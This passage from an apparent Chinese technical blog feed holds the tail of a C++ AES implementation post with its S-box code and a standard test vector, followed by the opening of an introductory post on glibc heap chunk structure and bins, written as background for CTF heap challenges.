class="keyword">size_t</span> cntX = <span class="number">0</span>; cntX &lt; <span class="number">16</span>; cntX++)</span><br><span class="line">        &#123;</span><br><span class="line">            BYTE bytSource = (BYTE)MAKEBYTE(cntY, cntX);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == bytSource)</span><br><span class="line">            &#123;</span><br><span class="line">                g_mtxPositiveBox[cntY][cntX] = g_bytPositiveFixed;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            PolynomialGF2 polyInverseElement;</span><br><span class="line">            PolynomialGF2 polyX;</span><br><span class="line">            PolynomialGF2 polySource = bytSource;</span><br><span class="line">            <span class="keyword">if</span> (!polySource.EqualZero())</span><br><span class="line">            &#123;</span><br><span class="line">                PolynomialGF2 polyResult =</span><br><span class="line">                    PolynomialEuclidEx(g_polyModle,</span><br><span class="line">                                       polySource,</span><br><span class="line">                                       polyX,</span><br><span class="line">                                       polyInverseElement);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                polyInverseElement = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            polyInverseElement.ClearInvalidZero();</span><br><span class="line">            MatrixGF2&lt;BYTE&gt; mtxValue = polyInverseElement.GetDequeFormat();</span><br><span class="line"> </span><br><span class="line">            mtxValue.PaddingRow(</span><br><span class="line">                g_mtxBytePositiveTransformMatrix.GetColumnNumber()</span><br><span class="line">            );</span><br><span class="line">            mtxFixed.PaddingRow(mtxValue.GetRowNumber());</span><br><span class="line"> </span><br><span class="line">            mtxValue = g_mtxBytePositiveTransformMatrix * mtxValue + mtxFixed;</span><br><span class="line">            g_mtxPositiveBox[cntY][cntX] =</span><br><span class="line">                (BYTE)PolynomialGF2(mtxValue.Transform2Vector()).ToNumber();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitReverseBox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MatrixGF2&lt;BYTE&gt; mtxFixed = PolynomialGF2(g_bytReverseFixed).GetDequeFormat();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntY = <span class="number">0</span>; cntY &lt; <span class="number">16</span>; cntY++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> cntX = <span class="number">0</span>; cntX &lt; <span class="number">16</span>; cntX++)</span><br><span class="line">        &#123;</span><br><span class="line">            BYTE bytSource = (BYTE)MAKEBYTE(cntY, cntX);</span><br><span class="line">            MatrixGF2&lt;BYTE&gt; mtxValue = bytSource;</span><br><span class="line">            <span class="keyword">int</span> iValueColumnNumber =</span><br><span class="line">                g_mtxByteReverseTransformMatrix.GetColumnNumber();</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == bytSource)</span><br><span class="line">            &#123;</span><br><span class="line">                mtxValue.InsertRow(<span class="number">0</span>, iValueColumnNumber, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            mtxValue.PaddingRow(iValueColumnNumber);</span><br><span class="line">            mtxFixed.PaddingRow(mtxValue.GetRowNumber());</span><br><span class="line">            mtxValue = g_mtxByteReverseTransformMatrix * mtxValue + mtxFixed;</span><br><span class="line">            PolynomialGF2 polyInverseElement;</span><br><span class="line">            PolynomialGF2 polyX;</span><br><span class="line">            PolynomialGF2 polyValue = mtxValue.Transform2Vector();</span><br><span class="line">            <span class="keyword">if</span> (!polyValue.EqualZero())</span><br><span class="line">            &#123;</span><br><span class="line">                PolynomialGF2 polyResult =</span><br><span class="line">                    PolynomialEuclidEx(g_polyModle,</span><br><span class="line">                                       polyValue,</span><br><span class="line">                                       polyX,</span><br><span class="line">                                       polyInverseElement);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                polyInverseElement = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            g_mtxReverseBox[cntY][cntX] = (BYTE)polyInverseElement.ToNumber();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStandardBox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_polyModle = &#123; <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    PolynomialGF2 polyPositiveSeed = &#123; <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    InitByteTransformMatrix(polyPositiveSeed, g_mtxBytePositiveTransformMatrix);</span><br><span class="line">    PolynomialGF2 polyReverseSeed = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    InitByteTransformMatrix(polyReverseSeed, g_mtxByteReverseTransformMatrix);</span><br><span class="line">    g_bytPositiveFixed = <span class="number">0x63</span>;</span><br><span class="line">    g_bytReverseFixed = <span class="number">0x05</span>;</span><br><span class="line">    InitPositiveBox();</span><br><span class="line">    InitReverseBox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Positive box: \n%s\n"</span>,</span><br><span class="line">           g_mtxPositiveBox.GetWrittenFormat().c_str());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Reverse box: \n%s\n"</span>,</span><br><span class="line">           g_mtxReverseBox.GetWrittenFormat().c_str());</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    InitStandardBox();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重要的实现细节"><a href="#重要的实现细节" class="headerlink" title="重要的实现细节"></a>重要的实现细节</h2><h4 id="GF2域上的计算"><a href="#GF2域上的计算" class="headerlink" title="GF2域上的计算"></a>GF2域上的计算</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">PolynomialGF2 &amp;PolynomialGF2::<span class="keyword">operator</span>=(<span class="keyword">const</span> PolynomialGF2 &amp;kref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    m_deqPolynomial = kref_polyRight.m_deqPolynomial;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 &amp;PolynomialGF2::<span class="keyword">operator</span>=(PolynomialGF2 &amp;&amp;rvalue_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    m_deqPolynomial = <span class="built_in">std</span>::move(rvalue_polyRight.m_deqPolynomial);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>+(<span class="keyword">const</span> PolynomialGF2 &amp;ref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult = *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">int</span> iRightHeighestBitIndex = ref_polyRight.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">int</span> iLeftHeighestBitIext = polyResult.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">if</span> (iRightHeighestBitIndex &gt; iLeftHeighestBitIext)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> iGap = iRightHeighestBitIndex - iLeftHeighestBitIext;</span><br><span class="line">        polyResult.Insert(iLeftHeighestBitIext + <span class="number">1</span>, iGap, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; (<span class="keyword">size_t</span>)(iRightHeighestBitIndex + <span class="number">1</span>); cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult[cntI] ^= ref_polyRight[cntI];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>-(<span class="keyword">const</span> PolynomialGF2 &amp;ref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult = *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">int</span> iRightHeighestBitIndex = ref_polyRight.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">int</span> iLeftHeighestBitIext = polyResult.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">if</span> (iRightHeighestBitIndex &gt; iLeftHeighestBitIext)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> iGap = iRightHeighestBitIndex - iLeftHeighestBitIext;</span><br><span class="line">        polyResult.Insert(iLeftHeighestBitIext + <span class="number">1</span>, iGap, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; ref_polyRight.GetSize(); cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult[cntI] ^= ref_polyRight[cntI];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>-(<span class="keyword">const</span> PolynomialGF2 &amp;ref_polyRight) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult = *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">int</span> iRightHeighestBitIndex = ref_polyRight.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">int</span> iLeftHeighestBitIext = polyResult.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">if</span> (iRightHeighestBitIndex &gt; iLeftHeighestBitIext)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> iGap = iRightHeighestBitIndex - iLeftHeighestBitIext;</span><br><span class="line">        polyResult.Insert(iLeftHeighestBitIext + <span class="number">1</span>, iGap, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; ref_polyRight.GetSize(); cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult[cntI] ^= ref_polyRight[cntI];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>*(<span class="keyword">const</span> PolynomialGF2 &amp;ref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; ref_polyRight.GetSize(); cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        PolynomialGF2 polyTmp = *<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span> == ref_polyRight[cntI])</span><br><span class="line">        &#123;</span><br><span class="line">            polyTmp.Insert(<span class="number">0</span>, cntI, <span class="number">0</span>);</span><br><span class="line">            polyResult = polyResult + polyTmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>/(<span class="keyword">const</span> PolynomialGF2 &amp;kref_right)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125; <span class="comment">//! Polynomial::operator/() END</span></span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>%(<span class="keyword">const</span> PolynomialGF2 &amp;kref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult;</span><br><span class="line">    <span class="keyword">int</span> iLeftHightestBitIndex = GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">int</span> iRightHightestBitIndex = kref_polyRight.GetHightestBitIndex();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iLeftHightestBitIndex == iRightHightestBitIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult = kref_polyRight - *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (iLeftHightestBitIndex &lt; iRightHightestBitIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult = *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (iLeftHightestBitIndex &gt; iRightHightestBitIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        PolynomialGF2 polyQuotient;</span><br><span class="line">        Division(kref_polyRight, polyQuotient, polyResult);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 &amp;PolynomialGF2::<span class="keyword">operator</span>&lt;&lt;=(<span class="keyword">const</span> <span class="keyword">size_t</span> &amp;kref_uiNumber)</span><br><span class="line">&#123;</span><br><span class="line">    m_deqPolynomial.insert(m_deqPolynomial.cbegin(), kref_uiNumber, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (m_bEnableLeftMoveLimit &amp;&amp;</span><br><span class="line">        GetHightestBitIndex() &gt;= (<span class="keyword">int</span>)m_uiLeftMoveLimitBit)</span><br><span class="line">    &#123;</span><br><span class="line">        m_deqPolynomial.erase(<span class="built_in">std</span>::next(m_deqPolynomial.cbegin(),</span><br><span class="line">                                        m_uiLeftMoveLimitBit),</span><br><span class="line">                              m_deqPolynomial.cend());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 &amp;PolynomialGF2::<span class="keyword">operator</span>^=(<span class="keyword">const</span> PolynomialGF2 &amp;kref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> uiheighBit = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> uiLeftSize = m_deqPolynomial.size();</span><br><span class="line">    <span class="keyword">size_t</span> uiRightSize = kref_polyRight.GetSize();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> uiOperationSize = uiLeftSize;</span><br><span class="line">    <span class="keyword">if</span> (uiLeftSize &gt; uiRightSize)</span><br><span class="line">    &#123;</span><br><span class="line">        uiOperationSize = uiRightSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; uiOperationSize; cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        m_deqPolynomial[cntI] ^= kref_polyRight[cntI];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">master_key = <span class="number">0x2b7e151628aed2a6abf7158809cf4f3c</span></span><br><span class="line">plaintext = <span class="number">0x3243f6a8885a308d313198a2e0370734</span></span><br><span class="line">ciphertext = <span class="number">0x3925841d02dc09fbdc118597196a0b32</span></span><br><span class="line">encrypt：<span class="number">0x3925841d02dc09fbdc118597196a0b32</span></span><br><span class="line">decrypt：<span class="number">0x3243f6a8885a308d313198a2e0370734</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本实现了AES的基本加密算法的实现</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈Linux-Heap</title>
      <link href="/2019/10/07/%C7%B3%CC%B8Linux-Heap/"/>
      <url>/2019/10/07/%C7%B3%CC%B8Linux-Heap/</url>
      
        <content type="html"><![CDATA[<p>最近的CTF比赛单纯的栈溢出已经很少见了，基本都是堆题，所以被迫开始学习堆。堆的利用相对于栈溢出和格式化字符串会复杂很多，这里对堆的一些基本知识点和实现原理进行了一些小小的总结</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><blockquote><p>堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。</p></blockquote><p>先看看堆在虚拟内存中的位置</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/02.png" alt></p><p>堆不同于栈，堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的，且堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 <code>malloc</code>、<code>alloc</code>、<code>realloc</code> 函数分配内存后才会出现</p><p>初始时，堆的起始地址 <strong>start_brk</strong>以及堆的当前末尾 <strong>brk</strong>指向同一地址。根据是否开启 <strong>ASLR</strong>，两者的具体位置会有所不同</p><ul><li>不开启 <strong>ASLR</strong> 保护时，<strong>start_brk</strong> 以及 <strong>brk</strong> 会指向 <strong>data/bss</strong> 段的结尾。</li><li>开启 <strong>ASLR</strong> 保护时，<strong>start_brk</strong> 以及 <strong>brk</strong> 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li></ul><p>在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p><p>堆管理器处于用户程序与内核中间，主要做以下工作</p><ol><li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li><li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li></ol><p><strong>Linux操作系统中对堆操作的是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p><h2 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h2><p>我们都知道，在C中动态分配内存，使用的是<strong>malloc</strong>。其在<strong>GNU C(glibc)</strong>中的实现则是基于<strong>dlmalloc</strong>的<strong>ptmalloc</strong>。<strong>ptmalloc</strong>的基本思路是将堆上的内存区域划分为多个<strong>chunk</strong>，在分配/回收内存时，对<strong>chunk</strong>进行分割、回收等操作</p><p>具体地，每个<strong>chunk</strong>除了包含最终返回用户的那部分<strong>mem(user data (用户数据区))</strong>，还包含头部用于保存<strong>chunk</strong>大小的相关信息。在<strong>32</strong>位系统下，<strong>chunk</strong>头的大小为<strong>8 Bytes</strong>，且每个<strong>chunk</strong>的大小也是<strong>8 Bytes</strong>的整数倍</p><p>一个典型的<strong>chunk</strong>如下图所示：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/01.png" alt></p><p><strong>我们称前两个字段称为 chunk header，后面的部分称为 men（user data）。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</strong></p><p><strong>chunk</strong>头包括以下两部分：</p><table><thead><tr><th align="center">presize</th><th>只有在前面一个堆块是空闲的时候才有指，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0</th></tr></thead><tbody><tr><td align="center"><strong>size</strong></td><td><strong>当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息</strong></td></tr></tbody></table><p><strong>size</strong>字段的最后<strong>3bit</strong>相当于三个 <strong>flag</strong> ，有另外的作用</p><table><thead><tr><th align="center">NON_MAIN_ARENA</th><th align="center">这个堆块是否位于主线程</th></tr></thead><tbody><tr><td align="center"><strong>IS_MAPPED</strong></td><td align="center"><strong>记录当前 chunk 是否是由 mmap 分配的</strong></td></tr><tr><td align="center"><strong>PREV_INUSE</strong></td><td align="center"><strong>记录前一个 chunk 块是否被分配</strong></td></tr></tbody></table><p>我们需要记住的是最后一位</p><blockquote><p><strong>PREV_INUSE：用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1</strong></p></blockquote><p>所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节，所以前一个堆块的释放与否都和这两个字段（<strong>pre_size、size</strong>）的值有关，这是因为便于内存的释放操作（<strong>free</strong>）</p><p>如果当前chunk处于未被使用状态，则<strong>mem</strong>前<strong>8 bytes</strong>被用来存储其他信息，具体如下：</p><table><thead><tr><th align="center">fd</th><th align="center">下一个未被使用的chunk的地址</th></tr></thead><tbody><tr><td align="center"><strong>bk</strong></td><td align="center"><strong>上一个未被使用的chunk的地址</strong></td></tr></tbody></table><p>可以看到，<strong>chunk</strong>头中包含的大小信息，主要用来在获取内存中相邻<strong>chunk</strong>的地址（当前<strong>chunk</strong>地址减去前一<strong>chunk</strong>的大小，为前一<strong>chunk</strong>的地址；当前<strong>chunk</strong>地址加上当前<strong>chunk</strong>的大小，为后一<strong>chunk</strong>的地址）。而<strong>mem</strong>中的<strong>fd</strong>和<strong>bk</strong>只在当前<strong>chunk</strong>处于未被使用时才有意义。<strong>chunk</strong> 处于分配状态时，从 <strong>fd</strong> 字段开始是用户的数据。如果了解数据结构，便可以立刻看出，这些未被使用的<strong>chunks</strong>通过<strong>fd</strong>, <strong>bk</strong>组成了链表。事实上，<strong>malloc</strong>确实维护了一系列链表用于内存的分配和回收，这些链表被成为<strong>“bins”</strong></p><p>一般来说，每个<strong>bin</strong>链表中的<strong>chunk</strong>都有相同或将近的大小。根据<strong>bin</strong>所包含<strong>chunk</strong>的大小，可以将<strong>bin</strong>分为<strong>fastbin</strong>, <strong>unsorted bin</strong>, <strong>small bin</strong>, <strong>large bin</strong></p><p>如果我们尝试使用<code>malloc(8)</code></p><p>申请到的堆块总大小为 16 + 8 + 8 + 1 = 0x21</p><p>1.第一个 16 字节是<strong>系统最小分配的内存</strong>，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。</p><ul><li>在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节</li><li>例如，如果代码中是 malloc(0) 的话，<strong>堆管理器也会分配最小内存空间给你</strong></li></ul><p>2.第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）<br>3.第三个 8 字节为 size 字段的大小（32 位的为 4 字节）<br>4.最后一个 1 字节是 <strong>PREV_INUSE 的值，只有 0 或 1两个值</strong></p><h2 id="复杂结构"><a href="#复杂结构" class="headerlink" title="复杂结构"></a>复杂结构</h2><p>首先要明确用户在调用 malloc 函数时返回的值为<strong>一个指针，指向分配到堆空间（用户数据区）</strong>，这个在最前面的那个图片也已经标出来了。</p><p>有时候题目是以更复杂的情况，用指针来表示某个数据结构的，例如下面的这个例子：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/03.png" alt></p><table><thead><tr><th align="center">max_size</th><th align="center"></th></tr></thead><tbody><tr><td align="center"><strong>exist_num</strong></td><td align="center"><strong>First_chunk</strong></td></tr><tr><td align="center"><strong>0/1</strong></td><td align="center"><strong>First_chunk</strong></td></tr><tr><td align="center"><strong>len(first)</strong></td><td align="center"><strong>First_chunk</strong></td></tr><tr><td align="center"><strong>point_heap</strong></td><td align="center"><strong>First_chunk</strong></td></tr><tr><td align="center"><strong>0/1</strong></td><td align="center"><strong>Second_chunk</strong></td></tr><tr><td align="center"><strong>len(second)</strong></td><td align="center"><strong>Second_chunk</strong></td></tr><tr><td align="center"><strong>point_heap</strong></td><td align="center"><strong>Second_chunk</strong></td></tr></tbody></table><p>左边的这个本身就是一个堆块，用来存放一些全局信息</p><table><thead><tr><th align="center">first chunk（second chunk）</th><th align="center">表示第一和第二个结构</th></tr></thead><tbody><tr><td align="center"><strong>point_heap</strong></td><td align="center"><strong>来指向存储用户数据的堆块（chunk）</strong></td></tr><tr><td align="center"><strong>max_size</strong></td><td align="center"><strong>能够存储的最大结构数量</strong></td></tr><tr><td align="center"><strong>exist_num</strong></td><td align="center"><strong>已经存储的结构的数量</strong></td></tr></tbody></table><h3 id="IDA-中常见的指针表示形式"><a href="#IDA-中常见的指针表示形式" class="headerlink" title="IDA 中常见的指针表示形式"></a>IDA 中常见的指针表示形式</h3><p>在 IDA 伪代码中的指针形式形如下面的情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(qword_6020A8 + 8)</span><br></pre></td></tr></table></figure><p><strong>表示取到 qword_6020A8 这个地址加 8 偏移的那个地址存储的值</strong></p><p>汇编代码等同于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400F85                 mov     rax, cs:qword_6020A8</span><br><span class="line">.text:0000000000400F8C                 mov     rax, [rax+8]</span><br></pre></td></tr></table></figure><p>简单转化一下，也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(addr) = [addr]</span><br></pre></td></tr></table></figure><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>在 pwn 的堆题目中，经常会有像一些”笔记管理系统”之类的题目，例如下面这里例子</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/04.png" 